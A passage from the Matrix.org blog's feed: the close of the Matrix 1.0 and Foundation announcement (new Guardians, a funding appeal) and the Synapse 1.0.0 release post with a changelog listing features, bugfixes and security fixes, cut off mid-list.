&lt;p&gt;Parity has been pioneering Matrix enterprise use since the moment they decided to rely on Matrix for their internal and external communication back in 2016, and now run their own high-volume deployment, with end-to-end encryption enabled by default. Jutta represents organisations who are professionally dependent on Matrix day-to-day, as well as bringing her unique experiences around decentralisation and ensuring that Web 3.0 will be a fair web for all.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We’d like to offer a very warm welcome to the new Guardians, and thank them profusely for giving up their time to join the Foundation and help ensure Matrix stays on course for the years to come.&lt;&#x2F;p&gt;
&lt;p&gt;For the full update on the Foundation, please check out the new website content at &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;foundation&quot;&gt;https:&#x2F;&#x2F;matrix.org&#x2F;foundation&lt;&#x2F;a&gt; which should tell you everything you could possibly want to know about the Foundation, the Guardians, the Foundation’s legal Articles of Association, and the day-to-day Rules which define the Open Governance process.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;and-finally&quot;&gt;And finally…&lt;&#x2F;h2&gt;
&lt;p&gt;Matrix 1.0 has been a bit of an epic to release, but puts us on a much stronger footing for the future.&lt;&#x2F;p&gt;
&lt;p&gt;However, it’s very unlikely that we’d have made it this far if most of the core dev team wasn’t able to work on Matrix as their day job.  Right now we are actively looking for large-scale donations to the Matrix.org Foundation (and&#x2F;or investment in &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&quot;&gt;New Vector&lt;&#x2F;a&gt;) to ensure that the team can maintain as tight a focus on core Matrix work as possible, and to ensure the project realises its full potential.  While Matrix is growing faster than ever, this perversely means we have more and more distractions - whether that’s keeping the Matrix.org server safe and operational, or handling support requests from the community, or helping new members of the ecosystem get up and running.  If you would like Matrix to succeed, please &lt;a href=&quot;mailto:funding@matrix.org&quot;&gt;get in touch&lt;&#x2F;a&gt; if you’d like to sponsor work, prioritise features, get support contracts, or otherwise support the project.  We’re particularly interested in sponsorship around decentralised reputation work (e.g. publishing a global room directory which users can filter based on their preferences).&lt;&#x2F;p&gt;
&lt;p&gt;Finally, huge thanks to everyone who has continued to support us through thick and thin on &lt;a href=&quot;https:&#x2F;&#x2F;patreon.com&#x2F;matrixdotorg&quot;&gt;Patreon&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;liberapay.com&#x2F;matrixdotorg&quot;&gt;Liberapay&lt;&#x2F;a&gt; or other platforms.  Every little helps here, both in terms of practically keeping the lights on, and also inspiring larger donations &amp;amp; financial support.&lt;&#x2F;p&gt;
&lt;p&gt;So: thank you once again for flying Matrix.  We hope you enjoy 1.0, and we look forward to everything else landing on the horizon!&lt;&#x2F;p&gt;
&lt;p&gt;- Matthew, Amandine &amp;amp; the whole Matrix.org Team.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Synapse 1.0.0 released</title>
        <published>2019-06-11T00:00:00+00:00</published>
        <updated>2019-06-11T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2019/06/11/synapse-1-0-0-released/" type="text/html"/>
        <id>https://matrix.org/blog/2019/06/11/synapse-1-0-0-released/</id>
        
        <content type="html">&lt;p&gt;Well here it is: Synapse 1.0.&lt;&#x2F;p&gt;
&lt;p&gt;Synapse 1.0 is the reference implementation of the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&quot;&gt;Matrix 1.0 spec&lt;&#x2F;a&gt;. The goal of the release overall has been to focus on security and stability, such that we can officially declare Synapse (and Matrix) out of beta and recommended for production use. This means changing the default room protocol version used for new rooms to be &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;37871106c6fc6013c17b5711fb93853fff140267&#x2F;proposals&#x2F;2002-rooms-v4.md&quot;&gt;v4&lt;&#x2F;a&gt;, which includes the new &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;f714aaadd011ac736d779f8460202a8d95799123&#x2F;proposals&#x2F;1442-state-resolution.md&quot;&gt;state resolution algorithm&lt;&#x2F;a&gt;, as well as &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;erikj&#x2F;event_id_hashes&#x2F;proposals&#x2F;1659-event-id-as-hashes.md&quot;&gt;collision-resistant event IDs&lt;&#x2F;a&gt;, which are now formatted to be &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;rav&#x2F;proposal&#x2F;no_slash_in_event_id&#x2F;proposals&#x2F;1884-replace-slashes-in-event_ids.md&quot;&gt;URL safe&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Synapse 1.0 also ships with support for the upcoming &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;rooms&#x2F;v5.html&quot;&gt;v5 room protocol&lt;&#x2F;a&gt; (which enforces honouring server key validity periods), but this will not be used as the default for new rooms until a sufficient number of servers support it.&lt;&#x2F;p&gt;
&lt;p&gt;Please note that Synapse 1.0 does &lt;strong&gt;not&lt;&#x2F;strong&gt; include significant performance work or new features - our focus has been almost exclusively on providing a reference implementation of the Matrix 1.0 protocol. But having cleared our backlog on security&#x2F;stability issues we will finally be now unblocked to pursue work around reducing RAM footprint, eliminating forward-extremity build up, and shipping new features like Edits, Reactions &amp;amp; E2E cross-signing support.&lt;&#x2F;p&gt;
&lt;p&gt;As part of the security work, Synapse 1.0 contains a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;blob&#x2F;master&#x2F;docs&#x2F;MSC1711_certificates_FAQ.md#it-used-to-work-just-fine-why-are-you-breaking-everything&quot;&gt;breaking change&lt;&#x2F;a&gt; that requires a valid TLS certificate on the federation API endpoint. &lt;strong&gt;Servers that do not configure their certificate will no longer be able to federate post 1.0.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;It is also worth noting that Synapse 1.0.0 is the last release that will support Python 2.x and Postgres 9.4. For more information see &lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;04&#x2F;08&#x2F;synapse-deprecating-postgres-9-4-and-python-2-x&quot;&gt;here&lt;&#x2F;a&gt; but the TL;DR is that you should upgrade asap.&lt;&#x2F;p&gt;
&lt;p&gt;This release has been a long time coming. Many thanks indeed to everyone who helped test the release candidates and provided feedback along the way.&lt;&#x2F;p&gt;
&lt;p&gt;Synapse 1.0 is just one component of a larger Matrix 1.0 release, which you can &lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;06&#x2F;11&#x2F;introducing-matrix-1-0-and-the-matrix-org-foundation&quot;&gt;read all about here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;As ever, you can get the new update &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v1.0.0&quot;&gt;here&lt;&#x2F;a&gt; or any of the sources mentioned at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&lt;&#x2F;a&gt;. Note, Synapse is now available from PyPI, pick it up &lt;a href=&quot;https:&#x2F;&#x2F;pypi.org&#x2F;project&#x2F;matrix-synapse&#x2F;&quot;&gt;here&lt;&#x2F;a&gt;. Also, check out our &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;guides&#x2F;installing-synapse&quot;&gt;Synapse installation guide page&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The changelog since 0.99.5 follows:&lt;&#x2F;p&gt;
&lt;h1 id=&quot;synapse-1-0-0-2019-06-11&quot;&gt;Synapse 1.0.0 (2019-06-11)&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;bugfixes&quot;&gt;Bugfixes&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Fix bug where attempting to send transactions with large number of EDUs can fail. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5418&quot;&gt;#5418&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;improved-documentation&quot;&gt;Improved Documentation&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Expand the federation guide to include relevant content from the MSC1711 FAQ (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5419&quot;&gt;#5419&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;internal-changes&quot;&gt;Internal Changes&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Move password reset links to &#x2F;_matrix&#x2F;client&#x2F;unstable namespace. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5424&quot;&gt;#5424&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;synapse-1-0-0rc3-2019-06-10&quot;&gt;Synapse 1.0.0rc3 (2019-06-10)&lt;&#x2F;h1&gt;
&lt;p&gt;Security: Fix authentication bug introduced in 1.0.0rc1. Please upgrade to rc3 immediately&lt;&#x2F;p&gt;
&lt;h1 id=&quot;synapse-1-0-0rc2-2019-06-10&quot;&gt;Synapse 1.0.0rc2 (2019-06-10)&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;bugfixes-1&quot;&gt;Bugfixes&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Remove redundant warning about key server response validation. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5392&quot;&gt;#5392&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix bug where old keys stored in the database with a null valid until timestamp caused all verification requests for that key to fail. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5415&quot;&gt;#5415&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix excessive memory using with default &lt;code&gt;federation_verify_certificates: true&lt;&#x2F;code&gt; configuration. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5417&quot;&gt;#5417&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;synapse-1-0-0rc1-2019-06-07&quot;&gt;Synapse 1.0.0rc1 (2019-06-07)&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;features&quot;&gt;Features&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Synapse now more efficiently collates room statistics. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;4338&quot;&gt;#4338&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5260&quot;&gt;#5260&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5324&quot;&gt;#5324&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Add experimental support for relations (aka reactions and edits). (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5220&quot;&gt;#5220&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Ability to configure default room version. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5223&quot;&gt;#5223&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5249&quot;&gt;#5249&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Allow configuring a range for the account validity startup job. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5276&quot;&gt;#5276&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;CAS login will now hit the r0 API, not the deprecated v1 one. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5286&quot;&gt;#5286&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Validate federation server TLS certificates by default (implements &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;blob&#x2F;master&#x2F;proposals&#x2F;1711-x509-for-federation.md&quot;&gt;MSC1711&lt;&#x2F;a&gt;). (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5359&quot;&gt;#5359&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Update &#x2F;_matrix&#x2F;client&#x2F;versions to reference support for r0.5.0. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5360&quot;&gt;#5360&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Add a script to generate new signing-key files. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5361&quot;&gt;#5361&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Update upgrade and installation guides ahead of 1.0. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5371&quot;&gt;#5371&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Replace the &lt;code&gt;perspectives&lt;&#x2F;code&gt; configuration section with &lt;code&gt;trusted_key_servers&lt;&#x2F;code&gt;, and make validating the signatures on responses optional (since TLS will do this job for us). (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5374&quot;&gt;#5374&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Add ability to perform password reset via email without trusting the identity server. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5377&quot;&gt;#5377&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Set default room version to v4. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5379&quot;&gt;#5379&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;bugfixes-2&quot;&gt;Bugfixes&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Fixes client-server API not sending &amp;quot;m.heroes&amp;quot; to lazy-load &#x2F;sync requests when a rooms name or its canonical alias are empty. Thanks to @dnaf for this work! (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5089&quot;&gt;#5089&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Prevent federation device list updates breaking when processing multiple updates at once. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5156&quot;&gt;#5156&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix worker registration bug caused by ClientReaderSlavedStore being unable to see get_profileinfo. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5200&quot;&gt;#5200&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix race when backfilling in rooms with worker mode. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5221&quot;&gt;#5221&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix appservice timestamp massaging. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5233&quot;&gt;#5233&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Ensure that server_keys fetched via a notary server are correctly signed. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5251&quot;&gt;#5251&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Show the correct error when logging out and access token is missing. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5256&quot;&gt;#5256&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix error code when there is an invalid parameter on &#x2F;_matrix&#x2F;client&#x2F;r0&#x2F;publicRooms (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5257&quot;&gt;#5257&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix error when downloading thumbnail with missing width&#x2F;height parameter. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5258&quot;&gt;#5258&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix schema update for account validity. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5268&quot;&gt;#5268&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix bug where we leaked extremities when we soft failed events, leading to performance degradation. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5274&quot;&gt;#5274&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5278&quot;&gt;#5278&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5291&quot;&gt;#5291&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix &amp;quot;db txn &#x27;update_presence&#x27; from sentinel context&amp;quot; log messages. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5275&quot;&gt;#5275&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix dropped logcontexts during high outbound traffic. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5277&quot;&gt;#5277&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix a bug where it is not possible to get events in the federation format with the request &lt;code&gt;GET &#x2F;_matrix&#x2F;client&#x2F;r0&#x2F;rooms&#x2F;{roomId}&#x2F;messages&lt;&#x2F;code&gt;. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5293&quot;&gt;#5293&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix performance problems with the rooms stats background update. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5294&quot;&gt;#5294&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix noisy &#x27;no key for server&#x27; logs. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5300&quot;&gt;#5300&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix bug where a notary server would sometimes forget old keys. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5307&quot;&gt;#5307&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Prevent users from setting huge displaynames and avatar URLs. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5309&quot;&gt;#5309&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix handling of failures when processing incoming events where calling &lt;code&gt;&#x2F;event_auth&lt;&#x2F;code&gt; on remote server fails. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5317&quot;&gt;#5317&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Ensure that we have an up-to-date copy of the signing key when validating incoming federation requests. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5321&quot;&gt;#5321&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix various problems which made the signing-key notary server time out for some requests. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5333&quot;&gt;#5333&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix bug which would make certain operations (such as room joins) block for 20 minutes while attemoting to fetch verification keys. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5334&quot;&gt;#5334&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix a bug where we could rapidly mark a server as unreachable even though it was only down for a few minutes. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5335&quot;&gt;#5335&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5340&quot;&gt;#5340&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix a bug where account validity renewal emails could only be sent when email notifs were enabled. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5341&quot;&gt;#5341&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix failure when fetching batches of events during backfill, etc. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5342&quot;&gt;#5342&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Add a new room version where the timestamps on events are checked against the validity periods on signing keys. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5348&quot;&gt;#5348&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5354&quot;&gt;#5354&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix room stats and presence background updates to correctly handle missing events. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5352&quot;&gt;#5352&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Include left members in room summaries&#x27; heroes. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5355&quot;&gt;#5355&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix &lt;code&gt;federation_custom_ca_list&lt;&#x2F;code&gt; configuration option. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5362&quot;&gt;#5362&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix missing logcontext warnings on shutdown. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5369&quot;&gt;#5369&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;improved-documentation-1&quot;&gt;Improved Documentation&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Fix docs on resetting the user directory. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5282&quot;&gt;#5282&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Fix notes about ACME in the MSC1711 faq. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5357&quot;&gt;#5357&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;internal-changes-1&quot;&gt;Internal Changes&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Synapse will now serve the experimental &amp;quot;room complexity&amp;quot; API endpoint. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5216&quot;&gt;#5216&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;The base classes for the v1 and v2_alpha REST APIs have been unified. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5226&quot;&gt;#5226&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5328&quot;&gt;#5328&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Simplifications and comments in do_auth. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5227&quot;&gt;#5227&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Remove urllib3 pin as requests 2.22.0 has been released supporting urllib3 1.25.2. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5230&quot;&gt;#5230&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Preparatory work for key-validity features. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5232&quot;&gt;#5232&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5234&quot;&gt;#5234&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5235&quot;&gt;#5235&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5236&quot;&gt;#5236&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5237&quot;&gt;#5237&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5244&quot;&gt;#5244&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5250&quot;&gt;#5250&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5296&quot;&gt;#5296&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5299&quot;&gt;#5299&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5343&quot;&gt;#5343&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5347&quot;&gt;#5347&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5356&quot;&gt;#5356&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Specify the type of reCAPTCHA key to use. (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5283&quot;&gt;#5283&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
